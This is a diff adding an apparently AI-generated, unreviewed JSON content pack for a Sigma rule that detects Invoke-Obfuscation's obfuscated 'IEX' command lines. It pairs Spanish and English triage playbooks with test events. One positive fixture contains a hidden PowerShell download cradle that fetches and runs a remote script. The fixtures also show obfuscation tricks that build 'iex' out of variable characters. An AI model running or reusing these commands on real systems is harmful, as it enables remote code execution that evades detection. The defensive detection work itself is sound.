@@ -1,0 +1,129 @@
+{
+  "rule": {
+    "id": "4bf943c6-5146-4273-98dd-e958fd1e3abf",
+    "title": "Invoke-Obfuscation Obfuscated IEX Invocation",
+    "level": "high",
+    "status": "test",
+    "author": "Daniel Bohannon (@Mandiant/@FireEye), oscd.community",
+    "path": "windows/process_creation/proc_creation_win_hktl_invoke_obfuscation_obfuscated_iex_commandline.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_hktl_invoke_obfuscation_obfuscated_iex_commandline.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1027",
+      "T1059.001"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se creó un proceso cuya línea de comandos contiene un patrón con el que Invoke-Obfuscation reconstruye 'IEX' (Invoke-Expression) a partir de caracteres de variables de PowerShell. Lo más probable es que alguien esté ejecutando código PowerShell ofuscado a propósito.",
+      "what_it_detects": "Expresiones regulares sobre CommandLine (sensibles a mayúsculas) que identifican los métodos de Invoke-Obfuscation para armar 'IEX': índices de $PSHome, $ShellId, $env:Public o $env:ComSpec, el comodín '*mdr*' con .Name, y $VerbosePreference convertido a String.",
+      "why_it_matters": "Así se evitan las firmas que buscan 'IEX' o 'Invoke-Expression' literal. Corresponde a T1027 (archivos o información ofuscados) y T1059.001 (PowerShell). Suele preceder a la descarga o ejecución de payloads en memoria.",
+      "triage_steps": [
+        "Revise el CommandLine completo e identifique qué patrón coincidió; reconstruya manualmente la cadena para confirmar que forma 'iex' y qué argumento recibe.",
+        "Busque eventos 4104 de Script Block Logging del mismo host y hora para obtener el código ya desofuscado.",
+        "Analice ParentImage y la cadena de procesos: Office, wscript, mshta, cmd o un servicio como padre aumentan la sospecha.",
+        "Verifique el usuario: si es una cuenta de servicio, un administrador o un usuario estándar, y si el inicio de sesión fue interactivo o remoto.",
+        "Revise conexiones de red, DNS y procesos hijos del mismo host dentro de +/- 15 minutos, especialmente descargas a IP o dominios externos.",
+        "Busque el mismo hash de CommandLine o el mismo patrón en otros hosts y alertas previas de este usuario o equipo.",
+        "Consulte con el equipo de seguridad si hay un ejercicio de red team o pruebas de detección autorizadas en curso."
+      ],
+      "false_positives": [
+        "Ejercicios autorizados de red team o pentesting que usan Invoke-Obfuscation.",
+        "Pruebas de detección o emulación (por ejemplo, Atomic Red Team) ejecutadas por el equipo de seguridad.",
+        "Laboratorios de capacitación o investigación de malware en equipos designados."
+      ],
+      "response_steps": [
+        "Si no hay una prueba autorizada, aísle el endpoint desde el EDR y preserve memoria y logs de PowerShell.",
+        "Termine el proceso de PowerShell y sus hijos después de capturar la evidencia y el árbol de procesos.",
+        "Bloquee los dominios, IP y hashes identificados en el código desofuscado; busque los mismos indicadores en toda la flota.",
+        "Elimine los mecanismos de persistencia encontrados (tareas programadas, claves Run, servicios, WMI) y restablezca las credenciales del usuario afectado.",
+        "Restaure el equipo a un estado limpio y confirme que no haya actividad repetida antes de reconectarlo."
+      ],
+      "severity_rationale": "El nivel high se justifica porque estos patrones casi solo aparecen en código generado por una herramienta de ofuscación ofensiva y la regla no documenta falsos positivos conocidos."
+    },
+    "en": {
+      "summary": "A process was started with a command line that contains an Invoke-Obfuscation pattern for building 'IEX' (Invoke-Expression) out of characters from PowerShell variables. This most likely means someone is running deliberately obfuscated PowerShell code.",
+      "what_it_detects": "Case-sensitive regexes on CommandLine that match the ways Invoke-Obfuscation builds 'IEX': indexing into $PSHome, $ShellId, $env:Public or $env:ComSpec, the '*mdr*' wildcard with .Name, and casting $VerbosePreference to String.",
+      "why_it_matters": "The trick gets past signatures that look for a literal 'IEX' or 'Invoke-Expression'. It maps to T1027 (obfuscated files or information) and T1059.001 (PowerShell). It often comes right before a payload is downloaded or run in memory.",
+      "triage_steps": [
+        "Read the full CommandLine and find which pattern matched. Rebuild the indexed characters by hand to confirm they spell 'iex' and see what argument gets executed.",
+        "Pull Script Block Logging events (4104) from the same host and time to see the deobfuscated code.",
+        "Check ParentImage and the process tree. A parent like Office, wscript, mshta, cmd or a service makes this more suspicious.",
+        "Check the user: service account, admin or standard user? Was the logon interactive or remote?",
+        "Look at network connections, DNS queries and child processes on the same host within +/- 15 minutes, especially downloads from external IPs or domains.",
+        "Search for the same command line or pattern on other hosts, and for earlier alerts on this user or host.",
+        "Ask the security team whether an authorized red team exercise or detection test is running."
+      ],
+      "false_positives": [
+        "Authorized red team or penetration tests that use Invoke-Obfuscation.",
+        "Detection or emulation tests (for example Atomic Red Team) run by the security team.",
+        "Training labs or malware research on designated machines."
+      ],
+      "response_steps": [
+        "If no authorized test explains it, isolate the endpoint through EDR and keep memory and PowerShell logs.",
+        "After you capture evidence and the process tree, kill the PowerShell process and its children.",
+        "Block the domains, IPs and hashes found in the deobfuscated code, then hunt for them across the fleet.",
+        "Remove any persistence you find (scheduled tasks, Run keys, services, WMI) and reset the affected user's credentials.",
+        "Restore the host to a clean state. Confirm the activity has not come back before you reconnect it."
+      ],
+      "severity_rationale": "High fits because these patterns almost never appear outside code generated by an offensive obfuscation tool, and the rule lists no known false positives."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "PowerShell launched from Word that uses $PSHome character indexing to invoke IEX on a download cradle",
+        "event": {
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+          "CommandLine": "powershell.exe -NoP -W Hidden -C \"&( $PSHome[21]+$PSHome[30]+'x') ((New-Object Net.WebClient).DownloadString('http://198.51.100.20/a.ps1'))\"",
+          "IntegrityLevel": "Medium"
+        }
+      },
+      {
+        "description": "PowerShell spawned by cmd that builds IEX from $env:ComSpec indexes joined together",
+        "event": {
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "powershell.exe -C \".( $env:ComSpec[4,15,25]-Join'') ('Write-Output test')\"",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "An administrator lists modules under $PSHome without indexing characters out of it",
+        "event": {
+          "Computer": "SRV-APP-03.andes.example.com",
+          "User": "ANDES\\adm_lgomez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "CommandLine": "powershell.exe -NoProfile -Command \"Get-ChildItem $PSHome\\Modules\"",
+          "IntegrityLevel": "High"
+        }
+      },
+      {
+        "description": "A script sets $VerbosePreference normally, without ToString() or a [String] cast",
+        "event": {
+          "Computer": "SRV-APP-03.andes.example.com",
+          "User": "ANDES\\svc_deploy",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+          "CommandLine": "powershell.exe -Command \"$VerbosePreference = 'Continue'; & C:\\Scripts\\deploy.ps1\"",
+          "IntegrityLevel": "System"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
